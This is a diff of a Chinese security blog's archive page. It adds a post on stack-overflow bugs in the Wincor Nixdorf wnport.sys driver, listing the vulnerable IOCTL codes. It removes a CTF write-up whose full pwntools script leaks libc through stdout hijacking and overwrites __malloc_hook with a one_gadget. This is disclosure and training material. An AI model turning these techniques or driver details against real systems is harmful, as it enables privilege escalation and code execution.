@@ -76,6 +76,60 @@
     <div class="article-wrap">
         
             <h2 class="article-title cl">
+                <a href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/" title="Wincor Nixdorf PORT IO Driver Stack Overflow">
+                    Wincor Nixdorf PORT IO Driver Stack Overflow
+                </a>
+            </h2>
+        
+
+        <ul class="article-extra" style="margin-bottom: 20px">
+            
+            <li class="article-time">
+                2025-06-26
+            </li>
+            
+
+            
+                
+            
+
+
+        </ul>
+        <div class="article-description">
+            
+            <p>The Wincor Nixdorf PORT IO Driver ‘wnport.sys’ was found to have multiple stack overflow vulnerabilities.</p>
+<p>Driver Download Link <a target="_blank" rel="noopener" href="https://driverpack.io/en/hwids/ROOT%5CWNPORT">https://driverpack.io/en/hwids/ROOT%5CWNPORT</a></p>
+<p><img src="/./Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626232106183.png" alt="image-20250626232106183"></p>
+<p>The Driver ‘s <strong>Digital Signature</strong>. though it’s has not WHQL signature. is still permitted to be loaded by the latest version of Windows. However, for drivers with valid digital signatures issued before this policy update, Windows maintains compatibility by allowing them to bypass the WHQL requirement. </p>
+<p>Therefore, this driver may still have an impact on the new 32-bit version of Windows.</p>
+<p>The <code>IOCTL_DEVICEIO_CONTROL_FUNCTION</code> subroutine at <code>sub_11100</code> contains multiple IOCTL handlers that can trigger stack overflow conditions. Specifically, the following IOCTL codes are affected:</p>
+<ul>
+<li><code>0x80102040</code></li>
+<li><code>0x80102044</code></li>
+<li><code>0x80102050</code></li>
+<li><code>0x80102054</code></li>
+</ul>
+<p><img src="/./Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626232659410.png" alt="image-20250626232659410"></p>
+<p>The <code>MaxCount</code> parameter actually represents the input buffer length, while <code>CommitSize</code> is constrained to a maximum of four <code>size_t</code> units. Consequently, a stack overflow will occur if the input buffer length exceeds the <code>CommitSize</code>.</p>
+<p><img src="/./Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626233012724.png" alt="image-20250626233012724"></p>
+<p>After using <code>DeviceIoControl</code> to send a large input buffer that exceeds the driver’s internal stack allocation , the system may encounter a stack overflow condition. This occurs because the driver’s IOCTL handler at sub_11100 processes the buffer without proper bounds checking, leading to memory corruption.</p>
+<p><img src="/./Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/image-20250626233051235.png" alt="image-20250626233051235"></p>
+<p>This driver has triggered a <strong>PAGE_FAULT_NON_PAGE</strong> blue screen error, resulting in the system crashing., disrupting system operation by causing improper access to non-paged memory. Beyond the immediate system crash, its vulnerabilities can lead to memory corruption, enabling malicious entities to manipulate critical memory areas. In the worst - case scenario, it allows for arbitrary code execution, giving attackers the ability to run unauthorized commands with elevated privileges. What’s more concerning is that the driver’s IOCTL functions can be called by low - privileged programs, making it easier for attackers to exploit these flaws and undermine system integrity.</p>
+
+        </div>
+        
+            
+        
+        
+    </div>
+</article>
+
+        
+            
+            <article class="article">
+    <div class="article-wrap">
+        
+            <h2 class="article-title cl">
                 <a href="/2025/05/23/windows-hook-inline-hook/" title="windows hook - inline hook">
                     windows hook - inline hook
                 </a>
@@ -744,132 +798,6 @@ resp = requests.get(url=url)
 </article>
 
         
-            
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2025/04/23/2021-长城杯-院校组-K1ng-in-h3ap-I-stdout泄露libc初探/" title="[2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探">
-                    [2021 长城杯_院校组]K1ng_in_h3ap_I - stdout泄露libc初探
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2025-04-23
-            </li>
-            
-
-            
-                
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <p>题目存在UAF OFF-BY-ONE</p>
-<p>通过申请0x*8 的chunk 可以覆盖到size 位 </p>
-<p>所以可以让不属于unsortbin 的chunk free到unsortbin里面去</p>
-<p>然后再free一个chunk造成同时存在于unsortbin fastbin</p>
-<p>然后通过拿到_IO_2_1_STDOUT的控制权 覆盖_io_write_ptr指针</p>
-<p>让他打印一些地址 然后就可以拿到libc_base </p>
-<p>同时学到了 ogg 如果堆栈不平衡 可以写到_realloc_hook </p>
-<p>然后__malloc_hook写realloc就平衡了</p>
-<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
-<span class="hljs-comment">#from LibcSearcher import *</span>
-context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
-context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
-io = remote(<span class="hljs-string">&quot;node7.anna.nssctf.cn&quot;</span>,<span class="hljs-number">29639</span>)
-<span class="hljs-comment">#io = process(&quot;./pwn&quot;)</span>
-e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
-libc = ELF(<span class="hljs-string">&#x27;/home/rick/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():
-	<span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():
-    attach(io)
-
-s       = <span class="hljs-keyword">lambda</span> data               :io.send(data)
-sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
-sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
-sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
-r       = <span class="hljs-keyword">lambda</span> num                :io.recv(num)
-ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
-itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
-uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
-dlog     = <span class="hljs-keyword">lambda</span> name,data         :log.success(<span class="hljs-string">f&quot;get <span class="hljs-subst">&#123;name&#125;</span>=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(data))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):
-    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))
-    sla(<span class="hljs-string">b&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
-    sla(<span class="hljs-string">b&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size))    
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):
-    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))
-    sla(<span class="hljs-string">b&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
-
-<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):
-    sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))
-    sla(<span class="hljs-string">b&quot;index:&quot;</span>,<span class="hljs-built_in">str</span>(idx))
-    sla(<span class="hljs-string">b&quot;context:&quot;</span>,content)
-
-sla(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">666</span>))
-ru(<span class="hljs-string">b&quot;\n&quot;</span>)
-offset = libc.sym[<span class="hljs-string">&quot;printf&quot;</span>] - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]
-leak_printf_low_addr = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">b&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)
-stdout_addr_offset = <span class="hljs-built_in">hex</span>(leak_printf_low_addr - offset -<span class="hljs-number">0x43</span>)[<span class="hljs-number">2</span>:]
-add(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>)
-add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)
-add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>)
-add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>)
-edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">&#x27;\xb1&#x27;</span>)
-delete(<span class="hljs-number">1</span>) <span class="hljs-comment">#进入unsortbin</span>
-delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#进入fastbin 但是前面有进unsortbin的 所以合并 造成重叠</span>
-add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>)
-byte_data = <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(stdout_addr_offset[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(stdout_addr_offset)-<span class="hljs-number">2</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">2</span>)])
-edit(<span class="hljs-number">2</span>,byte_data)
-add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)
-add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>) <span class="hljs-comment">#get stdout - 0x43</span>
-edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x33</span>+p64(<span class="hljs-number">0xfbad1877</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-string">b&#x27;\x50&#x27;</span>)
-leak_stdout_131 = uu64(ru(<span class="hljs-string">b&quot;1. add&quot;</span>)[<span class="hljs-number">1</span>:<span class="hljs-number">7</span>]) <span class="hljs-comment">#&lt;_IO_2_1_stdout_+131</span>
-dlog(<span class="hljs-string">&quot;leak_stdout_131&quot;</span>,leak_stdout_131)
-libc_base = leak_stdout_131 - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="hljs-number">131</span>
-dlog(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)
-og = [<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]
-ogg = libc_base + og[<span class="hljs-number">0</span>]
-malloc_hook_fake_fastbin = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] -<span class="hljs-number">0x23</span>
-dlog(<span class="hljs-string">&quot;malloc_hook_fake_fastbin&quot;</span>,malloc_hook_fake_fastbin)
-add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>)
-delete(<span class="hljs-number">6</span>)
-edit(<span class="hljs-number">6</span>,p64(malloc_hook_fake_fastbin))
-add(<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>)
-add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>) <span class="hljs-comment">#get __malloc_hook fake fastbin</span>
-edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">11</span>+p64(ogg)+p64(libc_base+libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]+<span class="hljs-number">13</span>))
-<span class="hljs-comment">#通过把one_gadget 写到 realloc_hook 然后malloc_hook 写realloc 来达到栈平衡</span>
-add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)
-
-
-io.interactive()</code></pre>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Invin_cible/article/details/123042819">https://blog.csdn.net/Invin_cible/article/details/123042819</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/120386179">https://blog.csdn.net/yongbaoii/article/details/120386179</a></p>
-
-        </div>
-        
-            
-        
-        
-    </div>
-</article>
-
-        
         <ul class="pagination clear">
     <span class="page-number current">1</span><a class="page-number" href="/archives/2025/page/2/">2</a><span class="space">&hellip;</span><a class="extend next" rel="next" href="/archives/2025/page/2/">下一页</a>
 </ul>
@@ -883,7 +811,7 @@ io.interactive()</code></pre>
         
         <div class="widget-post widget" style="order: 1 ">
             <h2 class="widget-title"><i class="fa fa-file-text"></i> 近期文章</h2>
-            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/">从0开始的web生涯 - [第五空间 2021]WebFTP</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce</a></li></ul>
+            <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/06/26/Wincor-Nixdorf-PORT-IO-Driver-Buffer-Overflow/">Wincor Nixdorf PORT IO Driver Stack Overflow</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/23/windows-hook-inline-hook/">windows hook - inline hook</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/05/08/house-of-orange-%E6%AC%A7%E6%B6%A6%E5%90%89/">house of orange(欧润吉)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/2025-4-26-BOCCHI-THE-ROCK-%E4%B8%8A/">2025/4/26 BOCCHI THE ROCK(上)</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]no_wakeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]Do_you_know_http</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/">从0开始的web生涯 - [SWPUCTF 2021 新生赛]ez_unserialize</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84web%E7%94%9F%E6%B6%AF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP/">从0开始的web生涯 - [第五空间 2021]WebFTP</a></li></ul>
         </div>
         
 
